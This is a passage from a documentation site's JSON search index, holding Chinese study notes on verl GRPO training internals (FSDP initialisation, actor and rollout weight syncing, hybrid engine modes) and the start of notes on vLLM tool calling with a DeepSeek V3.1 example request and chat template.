\u5bf9\u8c61\uff09\uff0c\u5b83\u4eec\u5171\u4eab\u76f8\u540c\u7684\u5e95\u5c42 Ray Actors\uff08\u7269\u7406\u8fdb\u7a0b\uff09\uff0c\u4f46\u53ea\u66b4\u9732\u7279\u5b9a\u524d\u7f00\u7684\u65b9\u6cd5\uff0c\u5b9e\u73b0\u4e86\uff1a 1. \u8d44\u6e90\u590d\u7528\uff1a8 \u4e2a GPU \u800c\u4e0d\u662f 16 \u4e2a GPU 2. \u63a5\u53e3\u9694\u79bb\uff1a\u903b\u8f91\u4e0a\u5206\u79bb Actor \u548c Rollout \u529f\u80fd 3. \u96f6\u989d\u5916\u5f00\u9500\uff1a\u53ea\u662f Python \u5bf9\u8c61\u5c42\u9762\u7684\u5f15\u7528</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#q7-init","title":"Q7: init \u65f6\u663e\u5b58\u4e2d\u662f\u5426\u540c\u65f6\u5b58\u5728\u4e24\u4efd\u6a21\u578b\u6743\u91cd\uff1f","text":"<p>A: \u662f\u7684\uff01\u5728 FSDP \u521d\u59cb\u5316\u8fc7\u7a0b\u4e2d\uff0c\u663e\u5b58\u4e2d\u77ed\u6682\u5b58\u5728\u4e24\u4efd\u6743\u91cd\uff1a</p> <p>FSDP1 \u521d\u59cb\u5316\uff08<code>verl/workers/fsdp_workers.py:497-507</code>\uff09\uff1a <pre><code>1. from_pretrained() \u2192 \u52a0\u8f7d\u5b8c\u6574\u6a21\u578b\uff0832GB fp32\uff09\n2. FSDP() \u8c03\u7528 \u2192 \u521b\u5efa\u5206\u7247\u6a21\u578b\uff082GB bf16\uff09\n   \u251c\u2500\u2500 \u6b64\u65f6\u5cf0\u503c\uff1a32GB + 2GB = 34GB\n3. FSDP \u5185\u90e8\u91ca\u653e\u5b8c\u6574\u6a21\u578b \u2192 \u4ec5\u4fdd\u7559\u5206\u7247\uff082GB\uff09\n</code></pre></p> <p>FSDP2 \u521d\u59cb\u5316\uff08<code>verl/workers/fsdp_workers.py:530-532</code>\uff09\uff1a <pre><code>1. from_pretrained() \u2192 \u52a0\u8f7d\u5b8c\u6574\u6a21\u578b\uff0832GB fp32\uff09\n2. state_dict() \u2192 \u590d\u5236\u5b8c\u6574\u53c2\u6570\uff0832GB\uff09\n   \u251c\u2500\u2500 \u6b64\u65f6\u5cf0\u503c\uff1a32GB + 32GB = 64GB\n3. apply_fsdp2() \u2192 \u5e94\u7528\u5206\u7247\n4. \u91ca\u653e\u539f\u6a21\u578b\u548c state_dict \u2192 \u4ec5\u4fdd\u7559\u5206\u7247\uff082GB\uff09\n</code></pre></p> <p>\u603b\u7ed3\uff1a - \u5cf0\u503c\u663e\u5b58\uff1a34GB (FSDP1) \u6216 64GB (FSDP2) - \u7a33\u5b9a\u663e\u5b58\uff1a2GB (\u5206\u7247) + 4GB (\u4f18\u5316\u5668) = 6GB - \u8fd9\u662f FSDP \u521d\u59cb\u5316\u7684\u5fc5\u8981\u5f00\u9500\uff0c\u53ea\u5728\u521d\u59cb\u5316\u65f6\u53d1\u751f\u4e00\u6b21</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#q8-fsdp-rollout-fsdp","title":"Q8: FSDP \u521d\u59cb\u5316\u5728\u54ea\u91cc\uff1f\u540e\u7eed\u6bcf\u6b21 rollout \u5b8c\u90fd\u4f1a\u91cd\u65b0\u521d\u59cb\u5316 FSDP \u5417\uff1f","text":"<p>A: \u4e0d\u4f1a\uff01FSDP \u53ea\u5728 <code>init_model()</code> \u65f6\u521d\u59cb\u5316\u4e00\u6b21\u3002</p> <p>FSDP \u521d\u59cb\u5316\u4f4d\u7f6e\uff1a - <code>verl/workers/fsdp_workers.py:497-507</code> (FSDP1) - <code>verl/workers/fsdp_workers.py:530-532</code> (FSDP2) - \u8c03\u7528\u65f6\u673a\uff1aRay Trainer \u542f\u52a8\u65f6\u8c03\u7528 <code>init_model()</code>\uff08\u53ea\u6267\u884c\u4e00\u6b21\uff09</p> <p>\u540e\u7eed\u8bad\u7ec3\u6d41\u7a0b\uff1a <pre><code>\u521d\u59cb\u5316\u9636\u6bb5\uff08\u53ea\u6267\u884c\u4e00\u6b21\uff09\uff1a\n\u251c\u2500\u2500 __init__() \u2192 \u521d\u59cb\u5316\u5206\u5e03\u5f0f\u73af\u5883\n\u251c\u2500\u2500 init_model() \u2192 \u52a0\u8f7d\u6a21\u578b\n\u2502   \u251c\u2500\u2500 _build_model_optimizer() \u2192 FSDP \u521d\u59cb\u5316 \u2190 \u53ea\u6267\u884c\u4e00\u6b21\n\u2502   \u2514\u2500\u2500 _build_rollout() \u2192 Rollout \u521d\u59cb\u5316 \u2190 \u53ea\u6267\u884c\u4e00\u6b21\n\u2514\u2500\u2500 trainer_mode() \u2192 \u5207\u6362\u5230 Trainer Mode\n\n\u8bad\u7ec3\u8fed\u4ee3\uff08\u91cd\u590d\u6267\u884c\uff09\uff1a\n\u251c\u2500\u2500 generate_sequences()\n\u2502   \u251c\u2500\u2500 rollout_mode() \u2192 \u540c\u6b65\u53c2\u6570\u5230 Rollout\uff08\u4e0d\u91cd\u65b0\u521d\u59cb\u5316 FSDP\uff09\n\u2502   \u251c\u2500\u2500 Rollout \u63a8\u7406\n\u2502   \u2514\u2500\u2500 trainer_mode() \u2192 \u5207\u6362\u56de Trainer Mode\n\u251c\u2500\u2500 compute_log_prob() \u2192 \u4f7f\u7528\u5df2\u6709\u7684 FSDP \u6a21\u578b\n\u251c\u2500\u2500 update_actor() \u2192 \u66f4\u65b0\u5df2\u6709\u7684 FSDP \u53c2\u6570\n\u2514\u2500\u2500 \u4e0b\u4e00\u8f6e\u8fed\u4ee3...\n</code></pre></p> <p>\u5173\u952e\u70b9\uff1a 1. FSDP \u53ea\u521d\u59cb\u5316\u4e00\u6b21\uff08\u5728 <code>init_model()</code> \u4e2d\uff09 2. \u53c2\u6570\u540c\u6b65\u4e0d\u662f\u91cd\u65b0\u521d\u59cb\u5316\uff1a    - <code>rollout_mode()</code> \u53ea\u662f\u5c06 FSDP \u7684\u5f53\u524d\u53c2\u6570\u590d\u5236\u5230 Rollout    - \u4e0d\u4f1a\u91cd\u65b0\u8c03\u7528 <code>FSDP()</code> \u6216 <code>apply_fsdp2()</code> 3. \u6a21\u5f0f\u5207\u6362\u4e0d\u6539\u53d8 FSDP \u7ed3\u6784\uff1a    - <code>rollout_mode()</code> \u548c <code>trainer_mode()</code> \u53ea\u63a7\u5236\u663e\u5b58\u5206\u914d\uff08KV Cache\uff09    - FSDP \u6a21\u578b\u7ed3\u6784\u4fdd\u6301\u4e0d\u53d8</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#q9-actor-fsdp-rollout","title":"Q9: Actor FSDP \u6a21\u578b\u548c Rollout \u6a21\u578b\u7684\u53c2\u6570\u662f\u72ec\u7acb\u7684\u5417\uff1f","text":"<p>A: \u662f\u7684\uff0c\u5b83\u4eec\u662f\u4e24\u4efd\u72ec\u7acb\u7684\u6743\u91cd\uff1a</p> <p>\u7269\u7406\u5b58\u50a8\uff1a <pre><code>GPU 0:\n\u251c\u2500\u2500 Actor FSDP \u53c2\u6570\u5206\u7247: 2GB (bf16)\n\u2502   \u2514\u2500\u2500 \u5b58\u50a8\uff1aGPU \u663e\u5b58\n\u2502   \u2514\u2500\u2500 \u7528\u9014\uff1a\u8bad\u7ec3\uff08\u68af\u5ea6\u8ba1\u7b97\u3001\u53c2\u6570\u66f4\u65b0\uff09\n\u2502\n\u251c\u2500\u2500 Rollout \u53c2\u6570\uff08\u5b8c\u6574\uff09: 16GB (bf16)\n    \u2514\u2500\u2500 \u5b58\u50a8\uff1aGPU \u663e\u5b58\n    \u2514\u2500\u2500 \u7528\u9014\uff1a\u63a8\u7406\uff08\u751f\u6210\u5e8f\u5217\uff09\n</code></pre></p> <p>\u4e3a\u4ec0\u4e48\u9700\u8981\u4e24\u4efd\u6743\u91cd\uff1a 1. FSDP \u6a21\u578b\u662f\u5206\u7247\u7684\uff1a    - \u6bcf\u4e2a GPU \u53ea\u6709 1/8 \u7684\u53c2\u6570\uff082GB\uff09    - \u65e0\u6cd5\u76f4\u63a5\u7528\u4e8e\u63a8\u7406\uff08\u7f3a\u5c11\u5176\u4ed6 GPU \u7684\u53c2\u6570\uff09    - \u8bad\u7ec3\u65f6\u901a\u8fc7 All-Gather \u4e34\u65f6\u805a\u5408\u5b8c\u6574\u53c2\u6570</p> <ol> <li>Rollout \u6a21\u578b\u662f\u5b8c\u6574\u7684\uff1a</li> <li>\u6bcf\u4e2a GPU \u6709\u5b8c\u6574\u7684 8B \u53c2\u6570\uff0816GB\uff09</li> <li>\u63a8\u7406\u65f6\u53ef\u4ee5\u72ec\u7acb\u5de5\u4f5c\uff0c\u65e0\u9700\u8de8 GPU \u901a\u4fe1</li> <li>vLLM/SGLang \u9700\u8981\u5b8c\u6574\u6a21\u578b\u624d\u80fd\u9ad8\u6548\u63a8\u7406</li> </ol> <p>\u53c2\u6570\u540c\u6b65\u6d41\u7a0b\uff1a <pre><code>\u8bad\u7ec3\u66f4\u65b0 \u2192 Actor FSDP \u53c2\u6570\u6539\u53d8\uff082GB \u5206\u7247\uff09\n   \u2193\nrollout_mode() \u8c03\u7528\n   \u2193\n1. full_tensor() \u2192 All-Gather \u805a\u5408\u6240\u6709 GPU \u7684\u5206\u7247\uff08\u4e34\u65f6 16GB\uff09\n2. update_weights() \u2192 \u590d\u5236\u5230 Rollout \u6a21\u578b\uff0816GB\uff09\n3. \u91ca\u653e\u4e34\u65f6\u805a\u5408\u7684\u53c2\u6570\n   \u2193\nRollout \u6a21\u578b\u53c2\u6570\u5df2\u66f4\u65b0\uff0816GB\uff09\n</code></pre></p> <p>\u603b\u7ed3\uff1a - \u4e24\u4efd\u6743\u91cd\u72ec\u7acb\u5b58\u50a8\uff082GB FSDP \u5206\u7247 + 16GB Rollout \u5b8c\u6574\uff09 - \u901a\u8fc7\u53c2\u6570\u540c\u6b65\u4fdd\u6301\u4e00\u81f4\uff08\u6bcf\u6b21 rollout \u524d\u540c\u6b65\uff09 - \u603b\u663e\u5b58\uff1a2GB + 16GB = 18GB\uff08\u4e0d\u5305\u62ec\u4f18\u5316\u5668\u548c KV Cache\uff09</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#11","title":"11. \u603b\u7ed3","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#_2","title":"\u6838\u5fc3\u8981\u70b9","text":"<ol> <li>Hybrid Engine \u67b6\u6784\uff1a</li> <li>\u5728\u540c\u4e00\u7ec4 GPU \u4e0a\u5171\u7f6e Actor FSDP \u548c Rollout \u6a21\u578b</li> <li>\u901a\u8fc7\u52a8\u6001\u5207\u6362 Trainer Mode \u548c Rollout Mode \u590d\u7528\u663e\u5b58</li> <li> <p>\u8282\u7701 50% GPU \u8d44\u6e90</p> </li> <li> <p>\u6a21\u5f0f\u5207\u6362\u673a\u5236\uff1a</p> </li> <li>\u521d\u59cb\u5316\u540e\uff1a\u7cfb\u7edf\u5904\u4e8e Trainer Mode\uff08<code>verl/workers/fsdp_workers.py:650-656</code>\uff09</li> <li>\u6bcf\u6b21 generate_sequences()\uff1a<ul> <li>\u5f00\u59cb\u65f6\u8c03\u7528 <code>rollout_mode()</code>\uff08<code>verl/workers/fsdp_workers.py:945-950</code>\uff09</li> <li>\u7ed3\u675f\u65f6\u8c03\u7528 <code>trainer_mode()</code>\uff08<code>verl/workers/fsdp_workers.py:960-964</code>\uff09</li> </ul> </li> <li> <p>compute_log_prob() \u548c update_actor()\uff1a\u65e0\u9700\u5207\u6362\uff08\u5df2\u5728 Trainer Mode\uff09</p> </li> <li> <p>\u53c2\u6570\u540c\u6b65\u6d41\u7a0b\uff1a</p> </li> <li>Actor FSDP <code>state_dict()</code> \u2192 \u8fd4\u56de\u5206\u7247\u53c2\u6570\uff08DTensor\uff09</li> <li><code>full_tensor()</code> \u2192 All-Gather \u805a\u5408\u4e3a\u5b8c\u6574\u53c2\u6570\uff08NCCL \u901a\u4fe1 ~200ms\uff09</li> <li><code>rollout.update_weights()</code> \u2192 In-Place \u590d\u5236\u5230 Rollout \u6a21\u578b\uff08~100ms\uff09</li> <li> <p>\u5fc5\u987b\u6bcf\u6b21\u540c\u6b65\uff1a\u56e0\u4e3a Actor \u53c2\u6570\u5728\u6bcf\u6b21\u8bad\u7ec3\u540e\u90fd\u66f4\u65b0</p> </li> <li> <p>\u663e\u5b58\u5cf0\u503c\u7ba1\u7406\uff1a</p> </li> <li>\u5168\u5c40\u5cf0\u503c\uff1a56GB\uff08Rollout Mode + KV Cache\uff09</li> <li> <p>\u4f18\u5316\u65b9\u5411\uff1aParameter/Optimizer Offload\u3001Layered Summon\u3001\u51cf\u5c11 KV Cache</p> </li> <li> <p>Spawn \u5171\u7f6e\u673a\u5236\uff1a</p> </li> <li>\u7269\u7406\u5c42\u9762\uff1a8 \u4e2a Ray Actors\uff08\u5171\u4eab\uff09</li> <li>\u903b\u8f91\u5c42\u9762\uff1a\u591a\u4e2a RayWorkerGroup \u89c6\u56fe\uff08\u9694\u79bb\uff09</li> <li>\u76ee\u7684\uff1a\u907f\u514d\u4e3a\u6bcf\u4e2a\u529f\u80fd\u521b\u5efa\u72ec\u7acb GPU \u8fdb\u7a0b</li> </ol> <p>\u6587\u6863\u7248\u672c: v1.0 \u6700\u540e\u66f4\u65b0: 2025-01-XX \u9002\u7528 verl \u7248\u672c: v0.1.0+</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/","title":"vLLM Tool Calling \u673a\u5236\u8be6\u89e3","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#_1","title":"\ud83d\udccb \u76ee\u5f55","text":"<ol> <li>\u6838\u5fc3\u6982\u5ff5</li> <li>\u5de5\u4f5c\u6d41\u7a0b</li> <li>DeepSeek V3.1 \u5b8c\u6574\u793a\u4f8b</li> <li>Llama 3.1 \u5b8c\u6574\u793a\u4f8b</li> <li>\u4e24\u8005\u5bf9\u6bd4</li> <li>\u6e90\u7801\u89e3\u6790</li> <li>\u5b9e\u6218\u6307\u5357</li> </ol>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#_2","title":"\u6838\u5fc3\u6982\u5ff5","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#vllm-tool-calling","title":"\u2753 \u95ee\u9898\uff1a\u4e3a\u4ec0\u4e48\u9700\u8981 vLLM \u7684 Tool Calling \u673a\u5236\uff1f","text":"<p>\u5f88\u591a\u6a21\u578b\uff08\u5982 DeepSeek V3.1\u3001Llama 3.1\uff09\u7684\u539f\u751f <code>chat_template</code> \u5e76\u4e0d\u652f\u6301\u5904\u7406 <code>tools</code> \u53c2\u6570\u3002\u5373\u4f7f\u6a21\u578b\u5728\u9884\u8bad\u7ec3\u65f6\u5b66\u4f1a\u4e86 function calling \u7684\u683c\u5f0f\uff08special tokens\uff09\uff0ctokenizer \u7684\u6a21\u677f\u4e5f\u65e0\u6cd5\u81ea\u52a8\u5c06\u5de5\u5177\u63cf\u8ff0\u6ce8\u5165\u5230 prompt \u4e2d\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#vllm","title":"\u2705 vLLM \u7684\u89e3\u51b3\u65b9\u6848","text":"<p>vLLM \u901a\u8fc7\u4ee5\u4e0b\u4e09\u4e2a\u6838\u5fc3\u7ec4\u4ef6\u5b9e\u73b0\u5b8c\u6574\u7684 tool calling \u652f\u6301\uff1a</p> <ol> <li>\u81ea\u5b9a\u4e49 Chat Template - \u8d1f\u8d23\u5c06\u5de5\u5177\u63cf\u8ff0\u6ce8\u5165\u5230 prompt</li> <li>ToolParser - \u8d1f\u8d23\u89e3\u6790\u6a21\u578b\u8f93\u51fa\u4e2d\u7684\u5de5\u5177\u8c03\u7528</li> <li>\u670d\u52a1\u5c42\u96c6\u6210 - \u5c06\u4e0a\u8ff0\u7ec4\u4ef6\u65e0\u7f1d\u6574\u5408\u5230 OpenAI \u517c\u5bb9\u7684 API \u4e2d</li> </ol>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#_3","title":"\u5de5\u4f5c\u6d41\u7a0b","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 1. \u7528\u6237\u8bf7\u6c42\uff08\u542b messages + tools\uff09                                \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 2. vLLM \u670d\u52a1\u5c42                                                    \u2502\n\u2502    - \u9009\u62e9\u5bf9\u5e94\u7684 chat_template\uff08deepseekv31.jinja/llama3.1.jinja\uff09\u2502\n\u2502    - \u8c03\u7528 apply_chat_template(messages, tools=tools)            \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 3. Chat Template \u5904\u7406                                             \u2502\n\u2502    - \u68c0\u6d4b\u5230 tools \u53c2\u6570\u4e0d\u4e3a\u7a7a                                      \u2502\n\u2502    - \u5c06\u5de5\u5177\u63cf\u8ff0\u683c\u5f0f\u5316\u5e76\u6ce8\u5165\u5230 system_prompt                        \u2502\n\u2502    - \u62fc\u63a5\u5b8c\u6574\u7684 prompt\uff08\u542b\u5de5\u5177\u5b9a\u4e49 + \u7528\u6237\u6d88\u606f\uff09                    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 4. \u6a21\u578b\u63a8\u7406                                                       \u2502\n\u2502    - \u63a5\u6536\u5b8c\u6574 prompt\uff08\u5df2\u5305\u542b\u5de5\u5177\u63cf\u8ff0\uff09                             \u2502\n\u2502    - \u751f\u6210\u8f93\u51fa\uff08\u4f7f\u7528\u9884\u8bad\u7ec3\u65f6\u5b66\u4e60\u7684 special tokens\uff09                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 5. ToolParser \u89e3\u6790                                                \u2502\n\u2502    - DeepSeekV31ToolParser: \u89e3\u6790 &lt;\uff5ctool\u2581call\u2581begin\uff5c&gt;... \u683c\u5f0f   \u2502\n\u2502    - Llama3JsonToolParser: \u89e3\u6790 {\"name\": \"...\", \"parameters\"...} \u2502\n\u2502    - \u63d0\u53d6\u7ed3\u6784\u5316\u7684\u5de5\u5177\u8c03\u7528\u4fe1\u606f                                      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 6. \u8fd4\u56de\u7ed9\u7528\u6237                                                     \u2502\n\u2502    - \u6807\u51c6 OpenAI \u683c\u5f0f\u7684 tool_calls                                \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#deepseek-v31","title":"DeepSeek V3.1 \u5b8c\u6574\u793a\u4f8b","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#1","title":"1. \u7528\u6237\u8bf7\u6c42","text":"<pre><code>import requests\n\nurl = \"http://localhost:8000/v1/chat/completions\"\npayload = {\n    \"model\": \"deepseek-ai/DeepSeek-V3.1\",\n    \"messages\": [\n        {\"role\": \"user\", \"content\": \"\u5317\u4eac\u4eca\u5929\u5929\u6c14\u600e\u4e48\u6837\uff1f\"}\n    ],\n    \"tools\": [\n        {\n            \"type\": \"function\",\n            \"function\": {\n                \"name\": \"get_weather\",\n                \"description\": \"\u83b7\u53d6\u6307\u5b9a\u57ce\u5e02\u7684\u5929\u6c14\u4fe1\u606f\",\n                \"parameters\": {\n                    \"type\": \"object\",\n                    \"properties\": {\n                        \"city\": {\n                            \"type\": \"string\",\n                            \"description\": \"\u57ce\u5e02\u540d\u79f0\"\n                        },\n                        \"unit\": {\n                            \"type\": \"string\",\n                            \"enum\": [\"celsius\", \"fahrenheit\"],\n                            \"description\": \"\u6e29\u5ea6\u5355\u4f4d\"\n                        }\n                    },\n                    \"required\": [\"city\"]\n                }\n            }\n        }\n    ],\n    \"tool_choice\": \"auto\"\n}\n\nresponse = requests.post(url, json=payload)\nprint(response.json())\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#2-chat-template","title":"2. Chat Template \u5904\u7406","text":"<p>\u6587\u4ef6: <code>examples/tool_chat_template_deepseekv31.jinja</code></p> <p>\u5173\u952e\u4ee3\u7801\uff08\u7b2c 19-26 \u884c\uff09\uff1a</p> <pre><code>{% if tools is defined and tools is not none %}\n  {% set tool_ns = namespace(text='## Tools\\nYou have access to the following tools:\\n') %}\n  {% for tool in tools %}\n    {% set tool_ns.text = tool_ns.text + '\\n### ' + tool.function.name +\n         '\\nDescription: ' + tool.function.description +\n         '\\n\\nParameters: ' + (tool.function.parameters | tojson) + '\\n' %}\n  {% endfor %}\n  {% set tool_ns.text = tool_ns.text +\n       \"\\nIMPORTANT: ALWAYS adhere to this exact format for tool use:\\n\" +\n       \"&lt;\uff5ctool\u2581calls\u2581begin\uff5c&gt;&lt;\uff5ctool\u2581call\u2581begin\uff5c&gt;tool_call_name&lt;\uff5ctool\u2581sep\uff5c&gt;\" +\n       \"tool_call_arguments&lt;\uff5ctool\u2581call\u2581end\uff5c&gt;&lt;\uff5ctool\u2581calls\u2581end\uff5c&gt;\\n...\" %}\n\n  {% set ns.system_prompt = ns.system_prompt + '\\n\\n' + tool_ns.text %}\n{% endif %}\n</code></pre> <p>\u751f\u6210\u7684\u5de5\u5177\u63cf\u8ff0\uff08\u6ce8\u5165\u5230 system_prompt\uff09\uff1a</p> <pre><code>## Tools\nYou have access to the following tools:\n\n### get_weather\nDescription: 